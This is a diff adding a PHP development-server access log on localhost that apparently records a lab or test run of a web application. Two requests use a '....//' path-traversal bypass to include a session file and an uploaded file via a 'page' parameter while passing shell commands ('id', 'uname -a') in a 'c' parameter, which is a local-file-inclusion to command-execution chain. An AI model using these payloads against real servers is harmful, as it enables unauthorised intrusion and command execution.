@@ -1,0 +1,28 @@
+[Tue Nov 24 00:00:08 2026] PHP 8.5.9 Development Server (http://127.0.0.1:8080) started
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52990 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52990 [200]: GET /index.php
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52990 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52992 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52992 [200]: GET /index.php
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52992 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52993 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52993 [200]: GET /index.php
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52993 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52994 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52994 [200]: GET /index.php?page=....//....//sessions/sess_d84ba730dd9169596eeb38cf9be4770e&c=id
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52994 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52996 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52996 [200]: GET /index.php
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52996 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52997 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52997 [302]: POST /login.php
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52997 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52998 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52998 [200]: GET /index.php
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52998 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52999 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52999 [200]: POST /upload.php
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:52999 Closing
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:53000 Accepted
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:53000 [200]: GET /index.php?page=....//uploads/notes.txt&c=uname%20-a
+[Tue Nov 24 00:00:10 2026] 127.0.0.1:53000 Closing
